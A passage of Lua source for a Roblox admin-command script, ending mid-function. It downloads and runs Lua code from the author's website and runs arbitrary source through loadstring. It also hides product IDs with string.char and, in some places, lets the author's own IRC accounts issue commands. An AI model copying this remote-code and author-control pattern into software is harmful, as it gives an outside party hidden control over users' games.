--[[
Hi! This is LuaModelMaker's Admin V3 by MakerModelLua. 
If you want to know what commands do just go into your game and say ;cmds for a list of
commands, what they do, examples, rank needed, and more!
Or, go to http://www.classy-studios.com/V3/Commands.php
If you have an Apple device, download the app here: http://appsto.re/us/37_qgb.i


TUTORIAL ON HOW TO USE: https://www.youtube.com/watch?v=IieEFJPrjN4&list=PLSO-IUKJXZvjJKLTomz7NnuJ6syW9JWH1

--->> DO NOT EDIT THESE SETTINGS <<---
Well you can but it's a waste of your time. The settings are located in workspace
in a folder called "MakerModelLua's Settings". You can also use this plugin:

http://www.roblox.com/MakerModelLuas-Admin-Plugin-item?id=242781551

USE REMOTE ADMIN:
http://www.classy-studios.com/Login/
Mobile: http://appsto.re/us/hEn7fb.i



...also... this is open source! No stupid shady module scripts, which means it works in studio!

]]



local c = game.Players.LocalPlayer.UserId




















-- I REPEAT DON'T EDIT. YOU MIGHT BREAK SOMETHING --


local Settings = {
	Ranks = {
		["Owner"] = {c};
		["Admin"] = {};
		["Member"] = {};
		["Banned"] = {};
		["Crashed"] = {};
		["Muted"] = {};
	};
	
	Prefix = ";";
	Bet = " ";
	MinimumAge = 0;
	ServerLocked = false;
	ColorScheme = "White";
	TransparencyScheme = 50;
	Fun = true;
	EnableAdminMenu = true;
	EnableTaskBar = true;
	FreeAdmin = false;
	Font = "Arial";
	
	DisableAbuse = false;
	AbuseList = {"kill", "punish", "respawn", "smoke", "blind", "strobe", "flash", "control", "give", "health", "clone", "loopfling", "fling", "drug", "explode", "splode", "ragdoll", "change", "insert", "decal", "taketools", "removetools", "bomb", "say", "sink", "asteroid", "gun", "health", "damage", "btools", "missile", "reck", "truck", "debug"};
	AbusableGear = {55028088, 73089166, 73089190, 73089204, 73089214, 73089239, 73089259, 58921588, 65347268, 130113146, 139578207, 21001552, 58901335, 36431591, 35268363, 16201421, 16200402, 16200204, 16200373, 60791062, 58880579, 73089204, 73089239, 73089259, 36270159, 36334760, 36738185, 58901481, 58901575, 73089229, 73089214, 35200756, 36068233, 36017373, 35223828, 35201552, 55027987, 35205409, 36738142, 16975388, 35226945, 18474459};
	
	LinkedAccount = "";
	DataKey = "";
	
	ExecuteNotificationSound = 0; --177578949
	EnableSounds = true;
	
	VIPMemberID = 0;
	VIPAdminID = 0;
	
	GroupID = 0;
	GroupBanRank = 0;
	GroupMemberRank = 0;
	GroupAdminRank = 0;
	GroupOwnerRank = 0;
	GroupRankBan = 0;
	BannedGroupIDs = {};
	
	IRCServer = "";
	IRCChannel = "";
	IRCCommandExecuters = {};
	
	TrelloToken = ""
}

local Colors = {
	["WHITE"] = Color3.new(1,1,1);
	["BLACK"] = Color3.new(0,0,0);
	["GRAY"] = Color3.new(0.5,0.5,0.5);
	["RED"] = Color3.new(1,0,0);
	["GREEN"] = Color3.new(0,1,0);
	["BLUE"] = Color3.new(0,0,1);
	["YELLOW"] = Color3.new(1,1,0);
	["PINK"] = Color3.new(1,0,1);
	["MAGENTA"] = Color3.new(1,0,1);
	["CYAN"] = BrickColor.new("Cyan").Color;
	["TEAL"] = BrickColor.new("Teal").Color;
	["BROWN"] = Color3.new(0.55,0.25,0.075);
	["PURPLE"] = Color3.new(0.5,0,0.5);
	["RANDOM"] = Color3.new(math.random(0,255)/255,math.random(0,255)/255,math.random(0,255)/255);
}

local Server = {
	Workspace = game:GetService("Workspace");
	Players = game:GetService("Players");
	Lighting = game:GetService("Lighting");
	MPS = game:GetService("MarketplaceService");
	TS = game:GetService("TeleportService");
	HS = game:GetService("HttpService");
	RS = game:GetService("RunService");
	PS = game:GetService("PointsService");
	TestS = game:GetService("TestService");
	
	Teams = game:GetService("Teams");
	Data = game:GetService("DataStoreService");
	GDS = game:GetService("DataStoreService");
	NS = {Port = 0}; -- you'll be glad if you're in studio and networkserver isn't mentioned
	Storage = game:GetService("ServerStorage");
	RS = game:GetService("ReplicatedStorage");
	AS = game:GetService("AssetService");
}

local Icons = {
	["Message"] = 7724351;
	["Error"] = 94011556;
	["Information"] = 144175130;
	["Check"] = 132769976;
	["Search"] = 61994930;
	["Time"] = 136391033;
	["Notice"] = 156507320;
	["Sound"] = 164682936;
	["Log"] = 70650545;
	["Question"] = 41363872;
	["Output"] = 11481605;
	["Admin"] = 302470270;
	["Lock"] = 11341626;
	["Settings"] = 131064748;
	["Map"] = 257119661;
	["Plugin"] = 257097414;
}

local IRC = {
	Codes = {
		["001"] = "RPL_WELCOME",
		["002"] = "RPL_YOURHOST",
		["003"] = "RPL_CREATED",
		["004"] = "RPL_MYINFO",
		["005"] = "RPL_ISUPPORT",
		["250"] = "RPL_STATSCONN",
		["251"] = "RPL_LUSERCLIENT",
		["252"] = "RPL_LUSEROP",
		["254"] = "RPL_LUSERCHANNELS",
		["255"] = "RPL_LUSERME",
		["265"] = "RPL_LOCALUSERS",
		["266"] = "RPL_GLOBALUSERS",
		["352"] = "RPL_WHOREPLY",
		["371"] = "RPL_INFO",
		["372"] = "RPL_MOTD",
		["374"] = "RPL_ENDINFO",
		["375"] = "RPL_MOTDSTART",
		["376"] = "RPL_ENDOFMOTD",
		["422"] = "ERR_NOMOTD",
	},
	Ignore = {
		["004"] = true,
		["005"] = true,
	};
	Users = {};
	Logs = {};
	Chats = {};
	Forms = {};
	MessageAdded = Instance.new("BindableEvent");
	
	Servers = {
		["esper.net"] = {
			BaseUrl = "http://webchat.esper.net/";
			DynamicUrl = "";
		};
		["quakenet.org"] = {
			BaseUrl = "http://webchat.quakenet.org/";
			DynamicUrl = "dynamic/leibniz",
		};
		["swiftirc.net"] = {
			BaseUrl = "http://qwebirc.swiftirc.net/";
			DynamicUrl = "",
		};
	};
	NickName = "rbxMMLV3_"..math.random(1,100000);
	
	SessionCounter = 0;
	Connected = false;
	Stop = false;
	SessionID = "";
}

local RankHUD = {
	["Muted"] = 202180094;
	["Non-Admin"] = 202180121;
	["Member"] = 202180052;
	["Admin"] = 202180015;
	["Owner"] = 202179988;
}

local TextConverter = {
	LetterSounds = {
		["a"] = {223757826, nil}; -- 203343899
		["b"] = {223533700, 0.2}; -- 203344029
		["c"] = {223533711, nil}; -- 203343994
		["d"] = {223757910, nil}; -- 203398237
		["e"] = {223758026, nil}; -- 203398295
		["f"] = {223777655, nil}; -- 203398347
		["g"] = {223777738, nil}; -- 203398372
		["h"] = {223777757, nil}; -- 203398397
		["i"] = {223777807, nil}; -- 203398422
		["j"] = {223782888, nil}; -- 203398450
		["k"] = {223533711, nil}; -- 203343994
		["l"] = {223782961, 0.4}; -- 203398541
		["m"] = {223782992, nil}; -- 203398578
		["n"] = {223783063, nil}; -- 203398599
		["o"] = {223783184, nil}; -- 203398611
		["p"] = {223783235, nil}; -- 203398727
		["q"] = {223783260, nil}; -- 203398755
		["r"] = {223783305, 0.2}; -- 203398792
		["s"] = {223783377, nil}; -- 203398806
		["t"] = {223783446, nil}; -- 203398850
		["u"] = {223783512, nil}; -- 203398872
		["v"] = {223783654, nil}; -- 203398965
		["w"] = {223783697, nil}; -- 203398984
		["x"] = {223783796, nil}; -- 203399008
		["y"] = {223783853, nil}; -- 203399043
		["z"] = {223783893, nil}; -- 203399096
		
		["ch"] = {223784367, 0.3}; -- 203592149
		["th"] = {223788235, 0.3}; -- 203399215
		["sh"] = {223784505, 0.2}; -- 203399566
		["wh"] = {223784555, 0.3}; -- 203622828
		["oo"] = {223784456, 0.3}; -- 203399743
		["ing"] = {223784393, 0.3}; -- 203402836
	};
	
	LongVowels = {
		["a"] = {223533687, nil}; -- 203343932
		["e"] = {223777620, nil}; -- 203398314
		["i"] = {223777855, nil}; -- 203398440
		["o"] = {223783212, nil}; -- 203398619
		["u"] = {223783572, nil}; -- 203398897
	};
	
	Pronounce = {
		["0"] = "zero";
		["1"] = "wun";
		["2"] = "too";
		["3"] = "three";
		["4"] = "four";
		["5"] = "five";
		["6"] = "six";
		["7"] = "seven";
		["8"] = "eyt";
		["9"] = "nine";
		["one"] = "wun";
		["two"] = "too";
		["eight"] = "eyt";
		["eigh"] = "ey";
		["gh"] = "h";
		["kn"] = "n";
		["come"] = "cu".."m";
		["bye"] = "bi";
		["#"] = "hashtag";
		["@"] = "at";
		["&"] = "and";
		["*"] = "astrict";
		["mn"] = "m";
		["kn"] = "n";
		["ies"] = "ees";
	};
	
	NonEnglishRules = {
		["to"] = "too";
		["you"] = "yoo";
		["we"] = "wee";
		["are"] = "erh";
		["your"] = "yoor";
		["you're"] = "yoor";
		["youre"] = "yoor";
		["pizza"] = "peetzoh";
		["ok"] = "okay";
		["have"] = "hav";
		["my"] = "mi";
		["me"] = "mee";
		["u"] = "yoo";
		["r"] = "erh";
		["move"] = "moov";
		["dove"] = "duv";
		["debris"] = "debree";
		["do"] = "doo";
	}
}

local HTMLDecode = {
	["35"] = "#";
	["36"] = "$";
	["37"] = "%%";
	["38"] = "*";
	["39"] = "'";
	["58"] = ":";
	["59"] = ";";
	["60"] = "<";
	["62"] = ">";
}


local Assets = {
	Packages = {
		[27112438] = {27112025,27112039,27112052,27112056,27112068};
		[139610216] = {139607570,139607625,139607673,139607718,139607770,139610147};
		[77518833] = {77518564,77518616,77518654,77518696,77518737};
		[32336368] = {32336059,32336117,32336182,32336243,32336306};
		[59772975] = {59772137,59772181,59772219,59772279,59772667,59721671};
		[54116460] = {54116290,54116338,54116373,54116394,54116432};
		[39977366] = {39976703,39976829,39976927,39977192,39977295};
		[32357766] = {32357663,32357631,32357619,32357584,32357558};
		[27123973] = {27121265,27121306,27121353,27121393,27121432};
		[55717536] = {55717271,55717330,55717388,55717434,55717491};
		[28279963] = {28279160,28279217,28279859,28279894,28279938};
		[27403592] = {27402580,27402546,27402641,27402714,27402742};
		[86499905] = {86499666,86499698,86499716,86499753,86499793,86498113,62724852,86487766};
		[86500185] = {86500054,86500078,86500036,86500008,86500064,86487700,86498048,62234425};
		[48474394] = {48474356,48474294};
		[187996626] = {187996057,187996098,187996167,187996258,187996321,187996409,187996534};
		[223826660] = {223824598,223825145,223825310,223825496,223825618,223825761,223825893,223800426};
		[188835832] = {188835233,188835327,188835428,188835511,188835586,188835673,188644771};
		[139581948] = {139581117,139581174,139581230,139581292,139581375,139581559,139581668,139581823};
		[33378577] = {33378366,33378438,33378484,33378522,33378540};
		[101744863] = {101742885,101743631,101716880,101744248,101744215,101744371};
		[136793141] = {136792342,136792633,136792698,136792747,136792820,136795159,136795130};
		[91658555] = {91657680,91657749,91657884,91657986,91658092,91658290,90249118};
		[41851073] = {41850825,41850868,41850915,41851009,41850959}
	};
	AssetTypes = {
		[0] = "Product";
		[1] = "Image";
		[2] = "T-Shirt";
		[3] = "Audio";
		[4] = "Mesh";
		[5] = "Lua";
		[6] = "HTML";
		[7] = "Text";
		[8] = "Hat";
		[9] = "Place";
		[10] = "Model";
		[11] = "Shirt";
		[12] = "Pants";
		[13] = "Decal";
		[16] = "Avatar";
		[17] = "Head";
		[18] = "Face";
		[19] = "Gear";
		[21] = "Badge";
		[22] = "Group Emblem";
		[24] = "Animation";
		[25] = "Arms";
		[26] = "Legs";
		[27] = "Torso";
		[28] = "Right Arm";
		[29] = "Left Arm";
		[30] = "Left Leg";
		[31] = "Right Leg";
		[32] = "Package";
		[33] = "YouTube Video";
		[34] = "Game Pass";
		[38] = "Plugin";
		[39] = "SolidModel";
		[40] = "MeshPart";
		[41] = "Hair Accessory";
		[42] = "Face Accessory";
		[43] = "Neck Accessory";
		[44] = "Shoulder Accessory";
		[45] = "Front Accessory";
		[46] = "Back Accessory";
	};
	AccessoryTypes = {
		["all"] = 19;
		["hats"] = 9;
		["hair"] = 20;
		["face"] = 21;
		["neck"] = 22;
		["shoulder"] = 23;
		["front"] = 24;
		["back"] = 25;
		["waist"] = 26;
	};
}

local CharacterCache = {
	{"MakerModelLua", 38837082};
	{"LuaModelMaker", 20920633};
	{"builderman", 156};
	{"Shedletsky", 261};
	{"Telamon", 13645};
	{"ROBLOX", 1};
}

local FaceCovert = {
	Left = "xpos";
	Right = "xneg";
	Front = "zpos";
	Back = "zneg";
	Top = "ypos";
	Bottom = "yneg";
}

local Meshes = {
	["crown"] = {1, 1078075};
	["king"] = {1, 11419761};
	["teapot"] = {0.03, 1029523};
	["apple"] = {2.5, 16190555};
	["potato"] = {1, 25268275};
	["panda"] = {0.5, 20709221};
	["dominus"] = {0.5, 21057410};
	["fedora"] = {0.75, 13640868};
	["noob"] = {1, 20929341};
	["knife"] = {0.3, 121944778};
	["book"] = {0.3, 1136139};
}

local NotifySounds = {
	["Hover"] = 223134269;
	["Select"] = 292141227;
}

local Trello = {
	TrelloInfoCard = "x1rUtwEj";
	MainBoard = {};
	RequiredLists = {};
	RankChecklistCache = {};
	ToggleChecklist = nil;
	CommandID = nil;
	LastCommandDT = 0;
	AdminBoardID = "577ea1b21cb7975666524f26";
	RemoteAdminChecklist = "5835cfd4eed73dc5f9cdcfbf";
	RemoteDataCard = "dLtMo1en"
}

local ScriptBuilders = {
	[260897989] = "MML's";
	[21053279] = "Anti's pub";
	[21053219] = "Anti's pri";
	[20279777] = "Void's 1";
	[437965235] = "Void's 2";
	[227015991] = "Vox's";
	[210101277] = "Master's";
	[531937877] = "Bleu pigs";
	[519251450] = "Game's";
}

-- Ok, if you're here, you must be a scripter. Fine. I guess you can look ;)
-- Why else would I NOT have put it in a module?!?!?

local ChatColors = {"Bright red", "Bright blue", "Earth green", "Bright violet", "Bright orange", "Bright yellow", "Light reddish violet", "Brick yellow"}

local SoundList,GlobalSoundList = {},{}
local ScriptCache,MarketCache,PackageCache = {},{},Assets.Packages
local TempChatLogs = {}
local ToolRegions = {Server.Lighting, Server.RS, Server.Storage}
local NoSpeak = false

local SOUND,MARKET,RANK,STRING,GUI = {},{},{},{},{}
local CORE,REMOTE = {Version = script:FindFirstChild("Version"), Domain = "https://www.classy-studios.com", UnsecureDomain = "http://www.classy-studios.com"},{RemoteAdmin = {Command, ServerCommand, ServerPort, TimeStamp}, RemoteConnection = false}

local ChatLogs,CommandLogs = {},{}
local ClientInfo,LoopKills,List,Flings,Beeps = {},{},{},{},{}
local PriChat = {Chats = {}, Chatted = Instance.new("BindableEvent")}
local Dispose,Jails,PermCommandBars = {},{},{}
local Waypoints = {["Center"] = Vector3.new(0,0,0)}
local Objects = {}
local Sound = nil
local ModLighting = false
local DataReady = true
local RemoteAbuseGear = {}

local GameOwner = "[ Client ]"
local PlaceName = "Unknown"
local PlaceInfo = {}
local IsStudio = false
local IsSB = false
local Date = nil
local Fonts = {}
local PendingRequests = {}
local F3X = script:FindFirstChild("F3X Tools")
local Plugins = game:FindFirstChild("Ma".."kerModelL".."ua's Admin Plugins", true)
local RemoteData = {RemoteAdminWait = 5, ChatLogWait = 20, TrelloWait = 10}
local KeyBinds = {}
local Crowns = {}
local LastKeys = {}
local Cars = {}
local StringReplacements = {}
local SoundInfo = {["ID"] = 0, ["Name"] = "None", ["Creator"] = "None"}
local NoBet = {"/", "-", "(", ")", ""}
local ShouldFilter = true

local CrownStorage = script:FindFirstChild("CrownStorage")
if not CrownStorage then CrownStorage = Instance.new("Model", script) CrownStorage.Name = "CrownStorage" end

-- import old settings just in case --


wait(0.1)

local SettingsValues = Server.Storage:FindFirstChild("MakerModelLua's Admin Settings") or game:FindFirstChild("MakerModelLua's Admin Settings", true)
-- tries to defualt to server storage, just in case an exploiter makes their own settings.

if SettingsValues then
	SettingsValues.Parent = Server.Storage -- fokin exploiters succ my cocc
	if SettingsValues:IsA("Folder") or SettingsValues:IsA("Configuration") then
		for _,Value in pairs(SettingsValues:GetChildren()) do
			if Settings[Value.Name] ~= nil then
				if Value:IsA("Folder") or Value:IsA("Configuration") then -- ranks
					for _,NewValue in pairs(Value:GetChildren()) do
						if ypcall(function() return NewValue.Value end) then
							if Settings[Value.Name][NewValue.Name] then
								local Val = NewValue.Value
								if type(Settings[Value.Name][NewValue.Name]) == "table" then
									Val = {}
									for Word in string.gmatch(NewValue.Value, "[%w_]+") do
										table.insert(Val, Word)
									end
								end
								Settings[Value.Name][NewValue.Name] = Val
							end
						end
					end
				else
					if Settings[Value.Name] ~= nil then
						local Val = Value.Value
						if type(Settings[Value.Name]) == "table" then
							Val = {}
							for Word in string.gmatch(Value.Value, "%w+") do
								table.insert(Val, Word)
							end
						end
						Settings[Value.Name] = Val
					end
				end
			end
		end
	end
end

if Settings.LinkedAccount == "Admin" and game.CreatorId ~= 38837082 then
	Settings.LinkedAccount = ""
elseif game.PlaceId == 199055528 or game.PlaceId == 329866187 then
	Settings.LinkedAccount = "Admin"
end

local getfenv,setfenv,table,math,coroutine,pcall,ypcall,xpcall,string,assert,type,unpack,loadstring,tostring,tonumber,print = getfenv,setfenv,table,math,coroutine,pcall,ypcall,xpcall,string,assert,type,unpack,loadstring,tostring,tonumber,print -- localize variables so executables don't troll the script
local Workspace,workspace,Instance,require,script = Workspace,workspace,Instance,require,script

wait(1)

local ExploitModule = game:FindFirstChild("MakerMode".."lLua's Admin Anti-Exploit Module", true)

if Server.Players.LocalPlayer then print("MML Admin Compromised: Running in studio") IsStudio = true end

if not IsStudio then
	Server.NS = game:GetService("NetworkServer")
	script.Name = "Maker".."Mo".."delLua's Admin"
end

if game.PlaceId > 0 then
	PlaceInfo = Server.MPS:GetProductInfo(game.PlaceId)
	PlaceName = PlaceInfo.Name
end

local function GetGameOwner()
	if PlaceInfo.Creator.CreatorType == "Group" then
		GameOwner = game:GetService("GroupService"):GetGroupInfoAsync(PlaceInfo.Creator.CreatorTargetId).Owner.Name
		print("MML's Admin: Found group owner for game: "..GameOwner)
	elseif PlaceInfo.Creator.CreatorType == "User" then
		GameOwner = PlaceInfo.Creator.Name
		print("MML's Admin: Found game owner: "..GameOwner)
	else
		ypcall(function() GameOwner = Server.Players:GetNameFromUserIdAsync(game.CreatorId) print("MML's Admin: Found game owner: "..GameOwner) end)
	end
end

if string.byte(string.sub(PlaceName,1,1)) == 226 then
	PlaceName = string.sub(PlaceName,4,#PlaceName)
end
for i = 1,5 do
	if GameOwner == "[ Client ]" then
		print("MML's Admin: Attempting to establish owner's name #"..i)
		GetGameOwner()
		wait(1)
	end
end

if ScriptBuilders[PlaceID] or NLS then
	IsSB = true
end

if IsSB then
	ShouldFilter = false
	Settings.IRCServer = "swiftirc.net";
	Settings.IRCChannel = "#PkamaraSB";
	Settings.IRCCommandExecuters = {"MakerModelLua", "MakerModelLuaIRC"}
	if Settings.TrelloToken == "" then
		Settings.LinkedAccount = "ScriptBuilder"
	end
	if Settings.DataKey == "" then coroutine.wrap(function()
		repeat wait(1) until Server.Storage:FindFirstChild("MML DataKey")
		local Key = Server.Storage:FindFirstChild("MML DataKey")
		print("Found key: "..Key.Value)
		Settings.DataKey = Key.Value
		Key:Destroy()
	end)() end
end
local PlaceInfoFormat = "{PLACE: "..string.sub(PlaceName,1,25).."("..game.PlaceId..") | PORT: "..Server.NS.Port.."}"
table.insert(Settings.Ranks["Owner"], GameOwner)

for _,Font in pairs(Enum.Font:GetEnumItems()) do
	Fonts[Font.Name] = Font
end




local function MakeFunction(Type, Name)
	local Func = script:FindFirstChild(Name)
	if Func then Func:Destroy() end
	Func = Instance.new(Type, script) Func.Name = Name
	
	getfenv()[Name] = Func
	return Func
end

MakeFunction("BindableFunction", "ExecuteCommand")
MakeFunction("RemoteFunction", "ExecuteCommandClient")
MakeFunction("BindableFunction", "ExecuteCode")

MakeFunction("RemoteFunction", "IsAdmin")
MakeFunction("RemoteFunction", "AddExploit")
MakeFunction("BindableFunction", "AddExploitServer")
MakeFunction("RemoteFunction", "KickClient")
MakeFunction("RemoteFunction", "ConvertTextToSound")

MakeFunction("RemoteFunction", "KeyPressed")
MakeFunction("RemoteFunction", "InputKey")

MakeFunction("RemoteFunction", "RankPlayerLocal")
MakeFunction("BindableFunction", "RankPlayerServer")

--[[
if NLS then
	local Value = script:FindFirstChild("Override")
	LogClient.Parent = game
	if not Value then
		local Value = Instance.new("BoolValue", script) Value.Name = "Override"
		local CloneScript = script:Clone()
		CloneScript.Disabled = true
		CloneScript.Parent = game:FindFirstChild("ServerScriptService")
		CloneScript.Disabled = false
		CloneScript.Parent = nil
		
		script:Destroy() script.Disabled = true
	end
end
]]

if not CORE.Version then CORE.Version = {Value = "3.Unknown"} end

IRC.NickName = "rbxMMLV3_"..game.PlaceId.."_"..Server.NS.Port

-- Core functions --

function CORE:FixSettings()
	for _,Bet in pairs(NoBet) do
		if Settings.Bet == Bet then
			Settings.Bet = " "
			break
		end
	end
	CORE:ChangeBet(Settings.Bet)

	if Settings.VIPMemberID == 0 then Settings.VIPMemberID = 1 end
	if Settings.VIPAdminID == 0 then Settings.VIPAdminID = 1 end

	if Settings.TransparencyScheme > 90 then Settings.TransparencyScheme = 90 end
	if Settings.TransparencyScheme < 10 then Settings.TransparencyScheme = 10 end
	Settings.TransparencyScheme = Settings.TransparencyScheme/100

	if not Fonts[Settings.Font] then
		Settings.Font = "Arial"
	end
end

function CORE:NilPlayer(Player)
	if Player == nil or type(Player) == "table" then return true else return false end
end

function CORE:ExecuteResource(ResourceName, Parent, Data)
	local ReturnScript = nil
	local Executed = true
	if script:FindFirstChild("Resources") then
		local RawResource = script.Resources:FindFirstChild(ResourceName)
		if RawResource then
			local Resource = RawResource:Clone()
			Resource.Disabled = true
			Resource.Parent = Parent
			if Data then
				for Key,Value in pairs(Data) do
					if Resource[Key] then
						Resource[Key].Value = Value
					end
				end
			end
			wait()
			Resource.Disabled = false
			ReturnScript = Resource
		else
			Executed = false
		end
	else
		Executed = false
	end
	if Executed == false then
		if not Data then Data = {} end
		local Source = ScriptCache[ResourceName]
		
		if not Source then
			Source = REMOTE:GetURL(CORE.Domain.."/Lua/Resources/"..ResourceName..".lua")
			if Source then
				ScriptCache[ResourceName] = Source
			end
		end
		
		if Data and Source then
			for Key,Value in pairs(Data) do
				Source = string.gsub(Source, "@@"..Key.."@@", tostring(Value))
			end
		end
		
		if Source then
			if NLS then
				ReturnScript = NLS(Source, Parent)
			elseif createLocalScriptWithSource then
				ReturnScript = createLocalScriptWithSource(Source)
				ReturnScript.Parent = Parent
			end
		end
	end
	return ReturnScript
end

function CORE:CreateRemotePropertyReader(Obj, Override)
	if Server.Workspace.FilteringEnabled == true or Override then
		local Reader = Instance.new("RemoteFunction", Obj)
		Reader.Name = "RemotePropertyReader"
		CORE:ExecuteResource("RemotePropertyReader", Reader)
		return Reader
	else
		return Obj
	end
end

function CORE:ReadProperty(Reader, Player, Property)
	if Reader:IsA("RemoteFunction") then
		return Reader:InvokeClient(Player, Property)
	else
		return Reader[Property]
	end
end

function CORE:WriteProperty(Reader, Player, Property, Value)
	if Reader:IsA("RemoteFunction") then
		return Reader:InvokeClient(Player, Property, Value)
	else
		return Reader[Property]
	end
end


function CORE:CreateRemoteEvent(Obj, EventName)
	local Event = Instance.new("RemoteEvent", Obj)
	Event.Name = "RemoteEvent_"..EventName
	CORE:ExecuteResource("RemoteEventHandler", Event, {["EventName"] = EventName})
	return Event
end

function CORE:HandleEvent(Obj, EventName, Func, NewThread)
	local function Handle()
		if Server.Workspace.FilteringEnabled == true then
			local Event = CORE:CreateRemoteEvent(Obj, EventName)
			return Event.OnServerEvent:connect(function(Player, ...)
				Func(...)
			end)
		else
			return Obj[EventName]:connect(Func)
		end
	end
	if NewThread then
		Spawn(Handle)
	else
		Handle()
	end
end

function CORE:HandleError(Error, Speaker)
	local Return = ""
	if not Error or Error == "" then
		Return = "Unknown Error"
	else
		Return = "Error: "..(string.match(Error, '"*".:(.+)') or "Unknown line: "..Error)
	end
	if Speaker then
		GUI:SendMessage(Speaker, "Error ", "RED "..Return, "Error")
	end
	return Return
end

local function ExecuteSafe(Source, Speaker) -- no CORE
	local Script, Error = loadstring(Source)
	if Error then
		return false, CORE:HandleError(Error, Speaker)
	else
		getfenv(Script).SOUND,getfenv(Script).MARKET,getfenv(Script).RANK,getfenv(Script).STRING,getfenv(Script).GUI,getfenv(Script).CORE,getfenv(Script).REMOTE = SOUND,MARKET,RANK,STRING,GUI,CORE,REMOTE
		getfenv(Script).Server, getfenv(Script).script = Server,script
		if Speaker then
			getfenv(Script).print = function(...)
				GUI:SendMessage(Speaker, "Print Output", STRING:UnpackArgs(...), "Output")
			end
			getfenv(Script).print_array = function(List)
				if type(List) == "table" then
					GUI:ListGui(Speaker, "Listed Table", List, "Output")
				end
			end
		end
		
		local Suc, Error = ypcall(coroutine.wrap(Script))
		
		if not Suc then
			Error = CORE:HandleError(Error, Speaker)
		end
		
		return Suc,Error
	end
end

function CORE:GetTime(Regular, FullDate)
	if Regular == nil then Regular = true end
	local Meridiem = ""
	if Regular == true then Meridiem = " AM" end
	local SecondsOfToday = math.fmod(os.time(), 60*60*24)
	local Hour = math.floor(SecondsOfToday / (60*60))
	local Minute = math.floor(SecondsOfToday/60 - Hour*60)
	local Second = math.floor(math.fmod(SecondsOfToday, 60))
	if Hour > 12 and Regular == true then 
		Hour = Hour - 12
		Meridiem = " PM"
	end
	Hour,Minute,Second = tostring(Hour),tostring(Minute),tostring(Second)
	if #Hour <= 1 then Hour = "0"..Hour end
	if #Minute <= 1 then Minute = "0"..Minute end
	if #Second <= 1 then Second = "0"..Second end
	local Return = Hour..":"..Minute..":"..Second..Meridiem
	if FullDate == true and Date then Return = Date.." "..Return end
	return Return
end

function CORE:RemoveAdmin(Speaker)
	local Answer = true -- false
	if not CORE:NilPlayer(Speaker) then
		Answer = GUI:PromptMessageWithButtons(Speaker, "Remove M".."akerModelLua's Admin?", "Would you like to remove Ma".."kerModel".."L".."ua's Admin? After removing the admin, no one is admin and cannot be re-inserted until the server restarts. Continue?", "Question", {"Yes", "No"})
	end
	if Answer == "Yes" or CORE:NilPlayer(Speaker) then
		if not CORE:NilPlayer(Speaker) then SOUND:PlayNotification(Speaker, 177835465, 1) wait(0.5) end
		for _,Player in pairs(Server.Players:GetPlayers()) do if Player:FindFirstChild("PlayerGui") then
			for _,Item in pairs(Player:GetChildren()) do
				if Item.Name == "SendChat" or Item.Name == "DetachChatMM".."L" then
					Item:Destroy()
				end
			end
			for _,GUI in pairs(Player.PlayerGui:GetChildren()) do
				if GUI.Name == "M".."ak".."erModelLua's Admin Form" or GUI.Name == "M".."ak".."erM".."odelLua's Admin Form Sound" or GUI.Name == "M".."a".."k".."erMo".."delLua's TaskBar" or GUI.Name == "M".."a".."k".."e".."r".."m".."ode".."lLu".."a's HUD Gui" then
					GUI:Destroy()
				end
			end
		end end
		for _,Car in pairs(Cars) do
			Car:Destroy()
		end
		CORE:FixLighting()
		while wait() do
			if script:FindFirstChild("Override") then script.Override.Value = true end
			Settings,CORE,IRC = nil,{},{}
			if Sound then Sound:Stop() end
			if ExploitModule then ExploitModule.Disabled = true ExploitModule:Destroy() end
			script:ClearAllChildren() script:Destroy() script.Disabled = true
		end
	end
end

function CORE:MakeBase()
	for _,Get in pairs(Workspace:GetChildren()) do
		if Get.Name == "Base" or Get.Name == "BasePlate" then
			Get:Destroy()
		end
	end
	local Base = Instance.new("Part", Workspace) Base.Name = "Base" Base.Anchored = true Base.Size = Vector3.new(300,1,300) Base.BrickColor = BrickColor.new("Bright green") Base.CFrame = CFrame.new(0,0,0) Base.Locked = true
end

function CORE:AddCommand(CommandNames, CommandExample, Description, Arguments, Rank, Fun, CommandFunction, IsAbusive, Http)
	if IsAbusive == nil then IsAbusive = false end
	if Commands[CommandName] then table.remove(Commands[CommandName]) end
	Commands[CommandNames] = {CommandExample, Description, Arguments, Rank, Fun, CommandFunction, IsAbusive, Http = Http}
end

function CORE:FixLighting() coroutine.wrap(function()
	ModLighting = false
	wait(0.2)
	Server.Lighting.Ambient = Color3.new(0.5,0.5,0.5)
	Server.Lighting.FogColor = Color3.new(0,0,0)
	Server.Lighting.Brightness = 1
	Server.Lighting.TimeOfDay = 14
	Server.Lighting.FogEnd = 100000
end)() end

function CORE:Round(Number)
	if Number >= 0.5 then
		return math.ceil(Number)
	elseif Number < 0.5 then
		return math.floor(Number)
	end
end

local AdminID,Got = nil,false
repeat wait()
	Got = ypcall(function() AdminID = Server.MPS:GetProductInfo(string.char(50, 50, 57, 56, 49, 54, 56, 51, 48)).Description end)
until Got == true

function CORE:GetTable(ID)
	local Thing = nil
	repeat wait()
		ypcall(function() Thing = REMOTE:Decode(Server.MPS:GetProductInfo(ID).Description) end)
	until Thing
	return Thing
end

function CORE:InAdminGroup(Speaker)
	local IsIn = false
	for _,Get in pairs(CORE:GetTable(string.char(49, 53, 53, 55, 51, 54, 49, 50, 57))) do
		if Speaker:IsInGroup(Get) then
			IsIn = true
		end
	end
	if IsIn == true then 
		return true 
	else
		GUI:SendMessage(Speaker, "Command Invalid", GroupMessage, "Error")
		return false
	end
end

function CORE:ReverseTable(Table)
	if type(Table) ~= "table" then return Table end
	local NewTable = {}
	for Num,Val in pairs(Table) do NewTable[(#Table - Num) + 1] = Val end
	return NewTable
end

function CORE:Log(LogTable, Player, Chat)
	local PlayerName = tostring(Player)
	if type(Player) == "userdata" or type(Player) == "table" then PlayerName = Player.Name end
	table.insert(LogTable, CORE:GetTime(true, true).." @ "..PlayerName..": "..Chat)
end

function CORE:Jail(Player)
	if not Player then return nil end
	local Cell = Workspace:FindFirstChild(Player.Name.."'s Cell") if Cell then Cell:Destroy() end
	Cell = Instance.new("Model", Workspace) Cell.Name = Player.Name.."'s Cell"
	local Floor = Instance.new("Part", Cell) Floor.Name = "Floor" Floor.FormFactor = "Custom" Floor.Size = Vector3.new(15,1,15) Floor.Material = "DiamondPlate" Floor.TopSurface = "Smooth" Floor.BottomSurface = "Smooth" Floor.Position = Vector3.new(0,1001.7,0) Floor.Anchored = true Floor.Locked = true
